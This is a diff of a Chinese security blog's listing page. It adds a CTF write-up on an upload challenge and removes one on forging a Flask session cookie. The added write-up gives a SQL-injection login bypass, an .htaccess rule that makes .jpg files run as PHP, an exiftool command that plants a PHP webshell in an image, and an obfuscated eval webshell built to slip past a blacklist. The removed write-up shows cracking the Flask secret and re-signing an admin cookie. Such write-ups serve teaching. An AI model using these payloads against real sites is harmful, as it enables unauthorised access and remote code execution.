@@ -1793,6 +1793,10 @@
       
         
       
+        
+      
+        
+      
     
     
     
@@ -1840,6 +1844,36 @@
 
           </label>
           <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../category/htaccess/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    .htaccess
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
             
               
                 
@@ -2240,6 +2274,36 @@
   
   
     <li class="md-nav__item">
+      <a href="../../category/%E5%9B%BE%E7%89%87%E9%A9%AC/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    图片马
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
       <a href="../../category/%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BF%A1%E4%BB%BB/" class="md-nav__link">
         
   
@@ -2527,6 +2591,122 @@
       <header class="md-typeset">
         <h1 id="2026">2026<a class="headerlink" href="#2026" title="Permanent link">&para;</a></h1>
       </header>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
+          <time datetime="2026-10-29 00:00:00+00:00">2026-10-29</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="../../category/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="md-meta__link">文件上传</a>, 
+              <a href="../../category/htaccess/" class="md-meta__link">.htaccess</a>, 
+              <a href="../../category/%E5%9B%BE%E7%89%87%E9%A9%AC/" class="md-meta__link">图片马</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 2 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="stage3-upload"><a class="toclink" href="../../zerog2026-stage3-upload/">Stage3 — Upload（极光科技）</a></h2>
+<p>刚进去看到只有一个图片，直接先看看源码：</p>
+<p><img alt="页脚里的后台入口" src="../../../assets/images/zerog2026-stage3-upload/01-footer.png" /></p>
+<p><strong>发现有一个 <code>admin</code> 后台管理</strong> —— 页脚里的 <code>&lt;a href="admin/"&gt;后台管理&lt;/a&gt;</code>。</p>
+<h3 id="_1"><a class="toclink" href="../../zerog2026-stage3-upload/#_1">进后台</a></h3>
+<p>进去看看，发现需要登陆。利用万能密码：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>admin'-- -
+</span></code></pre></div>
+<p>成功进入。</p>
+<p><strong>为什么这样能过 —— 因为后端大概是这样拼的：</strong></p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">'$u'</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="s1">'$p'</span>
+</span></code></pre></div>
+<p><strong>填进去之后变成：</strong></p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">'admin'</span><span class="c1">-- -' AND password='...'</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="w">                                          </span><span class="err">↑</span><span class="w"> </span><span class="err">从这里开始全被注释掉</span>
+</span></code></pre></div>
+<p><strong><code>--</code> 是 SQL 的注释符，后面那一整段（包括密码判断）都不执行了。</strong></p>
+<p><strong>所以它连密码都不用填对 —— 不用构造“条件为真”，只要让后半句消失就行。</strong></p>
+<h3 id="_2"><a class="toclink" href="../../zerog2026-stage3-upload/#_2">两个上传点</a></h3>
+<p>进去后发现可以上传配置文件：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>🖼️ 更新海报      只收 JPEG / GIF / PNG
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>⚙️ 配置文件管理    收 .htaccess / .ini
+</span></code></pre></div>
+<p><strong>先试试上传图片：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>直接上传一个空的 jpg  →  提示格式不对
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>上传正常的 jpg        →  可以
+</span></code></pre></div>
+<p><strong>这里就知道了会对</strong>内容<strong>进行校验，所以这里就明确用</strong>图片马<strong>。</strong></p>
+<h3 id="htaccess"><a class="toclink" href="../../zerog2026-stage3-upload/#htaccess">先上传 .htaccess</a></h3>
+<p>内容就一行：</p>
+<div class="language-apache highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="nb">AddType</span><span class="w"> </span>application/x-httpd-php<span class="w"> </span>.jpg
+</span></code></pre></div>
+<p><strong>⚠️ 这里要注意检查一遍。</strong></p>
+<p><strong>我最开始打成了 <code>httped</code>（多了 e 少了 d），导致后面一直以为我的命令被过滤了 —— 其实 PHP 根本没接管这个文件。</strong></p>
+<p><strong>判断依据：传完之后访问 <code>poster.jpg</code>，如果浏览器弹「保存文件」，就是 MIME 没被识别成 PHP；正常执行时 <code>Content-Type</code> 会变成 <code>text/html</code>。</strong></p>
+<h3 id="exiftool"><a class="toclink" href="../../zerog2026-stage3-upload/#exiftool">再用 exiftool 做图片马</a></h3>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="n">exiftool</span> <span class="n">-Comment</span><span class="p">=</span><span class="s1">'&lt;?php echo `$_GET[1]`; ?&gt;'</span> <span class="n">poster</span><span class="p">.</span><span class="n">jpg</span> <span class="n">-o</span> <span class="n">po1</span><span class="p">.</span><span class="n">jpg</span>
+</span></code></pre></div>
+<p><strong>我本来随便拿了一个 jpg 来构造，但是因为它内容较大、二进制数据较多，里面或多或少会出现 <code>&lt;?</code>。</strong></p>
+<p><strong>PHP 一旦在二进制里遇到 <code>&lt;?</code> 就当成 PHP 开头来解析，后面跟着的是随机字节 —— 于是报错：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>Parse error: syntax error, unexpected character 0x0E
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>in /var/www/html/uploads/poster.jpg on line 31
+</span></code></pre></div>
+<p><strong>所以这里建议用</strong>小体量<strong>的 jpg：比如题目里的背景图 <code>poster.jpg</code>，直接下载下来用。</strong></p>
+<p><strong>然后访问：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>/uploads/poster.jpg?1=env
+</span></code></pre></div>
+<p><strong>就能看到 flag：</strong></p>
+<p><img alt="env 里的 flag" src="../../../assets/images/zerog2026-stage3-upload/02-env-flag.png" /></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>ZeroG_2026_FLAG=ZeroGFlag{...}
+</span></code></pre></div>
+<hr />
+<h3 id="_3"><a class="toclink" href="../../zerog2026-stage3-upload/#_3">附：三个问题</a></h3>
+<h4 id="1-posterjpgv1793248668-v"><a class="toclink" href="../../zerog2026-stage3-upload/#1-posterjpgv1793248668-v">① <code>poster.jpg?v=1793248668</code> 里的 <code>v=</code> 是什么</a></h4>
+<p><img alt="Network 里的请求" src="../../../assets/images/zerog2026-stage3-upload/03-cache-buster.png" /></p>
+<p><strong>缓存破坏参数（cache buster）。</strong></p>
+<p><strong>文件名永远是 <code>poster.jpg</code>，浏览器会缓存旧图；加一个每次变化的 <code>v</code>（通常是 Unix 时间戳）让 URL 变掉，强制重新下载。</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>1793248668 ≈ 2026-10-29 的 Unix 时间戳（秒）
+</span></code></pre></div>
+<p><strong>服务器不读它，PHP 也不用它 —— 纯前端约定。</strong> 对我们反而有用：改完 payload 带上新 <code>v</code>，能确保看到的是新响应。</p>
+<h4 id="2-env-flag"><a class="toclink" href="../../zerog2026-stage3-upload/#2-env-flag">② 为什么用 <code>env</code> 找 flag，而不是找目录</a></h4>
+<p><strong>因为 flag 不一定是文件。</strong></p>
+<p><strong>这题的 flag 是平台在容器启动时通过环境变量注入的，不落盘：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>flag 不落盘 → 读文件读不到 → 备份/目录遍历/源码泄露都拿不到
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>只有真正拿到 RCE 才能读 → 考的是"能执行命令",不是"能猜路径"
+</span></code></pre></div>
+<p><strong>排查顺序应该是：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>① ls -la /            先看有没有 flag 文件
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>② env                 没有就查环境变量
+</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>③ find / -name "*flag*"   再扫一遍
+</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>④ cat /proc/self/environ  环境变量换个读法
+</span></code></pre></div>
+<h4 id="3-_post"><a class="toclink" href="../../zerog2026-stage3-upload/#3-_post">③ 能不能用 <code>$_POST</code> + 蚁剑</a></h4>
+<p><strong>能，但 <code>echo</code>$_POST["1"]`` 这种写法不行。</strong></p>
+<p><strong><code>echo \</code>...`` 是</strong>命令执行** —— 参数被当 shell 命令跑。**</p>
+<p><strong>蚁剑要的是</strong>代码执行** —— 它往参数里塞的是 PHP 代码，入口必须是：**</p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="x">eval($_POST['x'])</span>
+</span></code></pre></div>
+<p><strong>而 <code>eval</code> 在黑名单里，所以要用拼接：</strong></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="x">$a='ev'.'al'; $a($_POST[1]);</span>
+</span></code></pre></div>
+<p><strong>关键点：这道题的黑名单只扫</strong>上传文件的内容<strong>，不扫 HTTP 请求体 —— 所以蚁剑发过来的 body 里带什么词都不受影响。</strong></p>
+    
+    
+  </div>
+</article>
       
         <article class="md-post md-post--excerpt">
   <header class="md-post__header">
@@ -3671,149 +3851,6 @@
 </span></code></pre></div>
 <p>这一招专门用于绕过"禁止空字节"的过滤器，记进反序列化专题。</p>
 </div>
-    
-    
-  </div>
-</article>
-      
-        <article class="md-post md-post--excerpt">
-  <header class="md-post__header">
-    
-    <div class="md-post__meta md-meta">
-      <ul class="md-meta__list">
-        <li class="md-meta__item">
-          <time datetime="2026-10-24 00:00:00+00:00">2026-10-24</time></li>
-        
-          <li class="md-meta__item">
-            分类于
-            
-              <a href="../../category/%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A8/" class="md-meta__link">新手入门</a>, 
-              <a href="../../category/%E4%BC%9A%E8%AF%9D%E5%AE%89%E5%85%A8/" class="md-meta__link">会话安全</a></li>
-        
-        
-          
-          <li class="md-meta__item">
-            
-              需要 2 分钟阅读时间
-            
-          </li>
-        
-        
-      </ul>
-      
-    </div>
-  </header>
-  <div class="md-post__content md-typeset">
-    <h2 id="stage1-flasklogin"><a class="toclink" href="../../flasklogin/">Stage1 · FlaskLogin</a></h2>
-<p>这道题强调这是一个用 Flask 做的站点。</p>
-<p><img alt="登录页" src="../../../assets/images/flasklogin/01-login.png" /></p>
-<h3 id="_1"><a class="toclink" href="../../flasklogin/#_1">登录</a></h3>
-<p>页面提示「<code>guest / 123456</code> 之类的弱口令可能还在」。</p>
-<p>试了 <code>123456</code> 不行，换 <code>guest123</code> 进去了。</p>
-<p>登录后是普通用户空间：</p>
-<p><img alt="普通用户空间" src="../../../assets/images/flasklogin/02-guest.png" /></p>
-<p>页面提示：</p>
-<blockquote>
-<p><strong>试试看看你的「身份」是怎么被网站记住的？（F12 → Application → Cookies，那个 session cookie 引起了我的注意）</strong></p>
-</blockquote>
-<div class="admonition note">
-<p class="admonition-title">Firefox 里 Cookie 在哪</p>
-<p><strong>Firefox 的 Cookie 在「存储」(Storage) 面板里，不在「应用程序」里。</strong></p>
-<p>Chrome：Application → Cookies
-Firefox：存储 → Cookie</p>
-</div>
-<h3 id="cookie"><a class="toclink" href="../../flasklogin/#cookie">看 Cookie</a></h3>
-<p>看到 <code>session</code> 的值是：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>eyJ1c2VyIjoiZ3Vlc3QifQ.atybFQ.0due7kkk3LdRwoQPSckRCSMWv88
-</span></code></pre></div>
-<p><strong>注意：只有第一段是 base64，整条不是。</strong></p>
-<p>把第一段 <code>eyJ1c2VyIjoiZ3Vlc3QifQ</code> 拿去 base64 解码：</p>
-<div class="language-json highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="p">{</span><span class="nt">"user"</span><span class="p">:</span><span class="s2">"guest"</span><span class="p">}</span>
-</span></code></pre></div>
-<p>得到身份就是这一小段 JSON。</p>
-<h3 id="_2"><a class="toclink" href="../../flasklogin/#_2">认出格式</a></h3>
-<p>整条值长这样：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>eyJ1c2VyIjoiZ3Vlc3QifQ . atybFQ . 0due7kkk3LdRwoQPSckRCSMWv88
-</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>└───── 数据 ─────┘    └时间戳┘  └──────── HMAC 签名 ────────┘
-</span></code></pre></div>
-<p><strong>这是 Flask 默认的签名 session 格式：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>base64(JSON) . base64(时间戳) . base64(HMAC-SHA1)
-</span></code></pre></div>
-<p><strong>签名是拿 <code>SECRET_KEY</code> 对整个 <code>数据.时间戳</code> 算出来的。</strong></p>
-<h3 id="user-admin"><a class="toclink" href="../../flasklogin/#user-admin">直接改 user 为 admin？不行</a></h3>
-<p><strong>把 <code>{"user":"guest"}</code> 改成 <code>{"user":"admin"}</code> 再 base64 回去，塞进 Cookie —— 会被弹回登录页（302）。</strong></p>
-<p><strong>因为签名是对内容算的，内容一改，签名就对不上，服务端直接判无效。</strong></p>
-<p><strong>所以要改身份，必须先拿到 <code>SECRET_KEY</code>，自己重新签一个。</strong></p>
-<h3 id="secret_key"><a class="toclink" href="../../flasklogin/#secret_key">找 SECRET_KEY</a></h3>
-<p>先用 flask 工具爆破字典：</p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="n">python</span> <span class="n">-m</span> <span class="n">pip</span> <span class="n">install</span> <span class="n">flask-unsign</span> <span class="n">-i</span> <span class="n">https</span><span class="p">://</span><span class="n">pypi</span><span class="p">.</span><span class="n">tuna</span><span class="p">.</span><span class="n">tsinghua</span><span class="p">.</span><span class="n">edu</span><span class="p">.</span><span class="n">cn</span><span class="p">/</span><span class="n">simple</span>
-</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>
-</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="s1">'secret'</span><span class="p">,</span><span class="s1">'dev'</span><span class="p">,</span><span class="s1">'changeme'</span><span class="p">,</span><span class="s1">'ctf2026'</span> <span class="p">|</span> <span class="nb">Set-Content</span> <span class="n">wl</span><span class="p">.</span><span class="n">txt</span>
-</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="n">python</span> <span class="n">-m</span> <span class="n">flask_unsign</span> <span class="p">-</span><span class="n">-unsign</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"eyJ1c2VyIjoiZ3Vlc3QifQ.atybFQ.0due7kkk3LdRwoQPSckRCSMWv88"</span> <span class="p">-</span><span class="n">-wordlist</span> <span class="n">wl</span><span class="p">.</span><span class="n">txt</span>
-</span></code></pre></div>
-<p><strong>同时注意到页面上的 <code>ctf2026</code>（登录页标题 <code>🔑 ctf2026</code>）—— 拿它当 secret 一试就中。</strong></p>
-<h3 id="_3"><a class="toclink" href="../../flasklogin/#_3">重新签名</a></h3>
-<p><img alt="重新签名" src="../../../assets/images/flasklogin/03-sign.png" /></p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="n">python</span><span class="p">.</span><span class="n">exe</span> <span class="n">-m</span> <span class="n">flask_unsign</span> <span class="p">-</span><span class="n">-sign</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"{'user': 'admin'}"</span> <span class="p">-</span><span class="n">-secret</span> <span class="n">ctf2026</span>
-</span></code></pre></div>
-<p><strong>注意 <code>--cookie</code> 用的是 <strong>Python 字典语法</strong>（单引号），不是 JSON。</strong></p>
-<p>输出一条新的：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>eyJ1c2VyIjoiYWRtaW4ifQ.atyPOw.5-D0uOFDLKt18mszGkl5W9CVBGE
-</span></code></pre></div>
-<p><strong>把它整个替换掉 Cookie 里的 <code>session</code> 值，刷新。</strong></p>
-<div class="admonition warning">
-<p class="admonition-title">两个常见坑</p>
-<p><strong>① 密钥别打错</strong>：<code>ctf2026</code> 是 7 个字符，写成 <code>ctf20206</code> 就废了。</p>
-<p><strong>② 替换的是整条</strong>（三段都要），不是只换第一段。</p>
-</div>
-<h3 id="flag"><a class="toclink" href="../../flasklogin/#flag">拿到 flag</a></h3>
-<p><img alt="Welcome admin" src="../../../assets/images/flasklogin/04-flag.png" /></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>flag{fl4sk_s3ss10n_1s_n07_s3cur3}
-</span></code></pre></div>
-<h3 id="_4"><a class="toclink" href="../../flasklogin/#_4">这题的完整链路</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>① 弱口令登录        guest / guest123
-</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>② 观察 session      eyJ1c2VyIjoiZ3Vlc3QifQ.atybFQ.xxx
-</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>③ 解码第一段        {"user":"guest"}
-</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>④ 认出格式          base64(数据) . 时间戳 . HMAC 签名   ← Flask
-</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>⑤ 直接改内容        ❌ 302（签名校验失败）
-</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a>⑥ 找 SECRET_KEY     页面标题 ctf2026 / flask-unsign 爆破
-</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a>⑦ 自己重新签名      flask-unsign --sign --cookie "{'user':'admin'}" --secret ctf2026
-</span><span id="__span-19-8"><a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a>⑧ 替换整条 Cookie   → 👑 Welcome, admin → flag
-</span></code></pre></div>
-<h3 id="_5"><a class="toclink" href="../../flasklogin/#_5">知识点</a></h3>
-<p><strong>这题的核心是区分两件事：</strong></p>
-<table>
-<thead>
-<tr>
-<th>情况</th>
-<th>能不能改</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Cookie 里存<strong>明文身份</strong></td>
-<td>✅ 随便改（和前面米米那题第四关一样）</td>
-</tr>
-<tr>
-<td>Cookie 里存<strong>签名过的身份</strong></td>
-<td>❌ 改了签名就废，除非拿到密钥</td>
-</tr>
-</tbody>
-</table>
-<p><strong>Flask 的 session 属于第二种 —— 默认用 <code>SECRET_KEY</code> 做 HMAC-SHA1 签名。</strong></p>
-<p><strong>所以「Flask 站点 + session cookie」这个组合，标准套路就是：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>先试着解码 → 认出 .时间戳.签名 三段式 → 上 flask-unsign
-</span></code></pre></div>
-<h3 id="_6"><a class="toclink" href="../../flasklogin/#_6">工具备忘</a></h3>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="c"># 只看内容,不需要密钥</span>
-</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="n">python</span> <span class="n">-m</span> <span class="n">flask_unsign</span> <span class="p">-</span><span class="n">-decode</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"eyJ..."</span>
-</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>
-</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="c"># 爆破密钥</span>
-</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="n">python</span> <span class="n">-m</span> <span class="n">flask_unsign</span> <span class="p">-</span><span class="n">-unsign</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"eyJ..."</span> <span class="p">-</span><span class="n">-wordlist</span> <span class="n">wl</span><span class="p">.</span><span class="n">txt</span>
-</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>
-</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a><span class="c"># 用已知密钥伪造</span>
-</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a><span class="n">python</span> <span class="n">-m</span> <span class="n">flask_unsign</span> <span class="p">-</span><span class="n">-sign</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"{'user':'admin'}"</span> <span class="p">-</span><span class="n">-secret</span> <span class="n">ctf2026</span>
-</span></code></pre></div>
     
     
   </div>
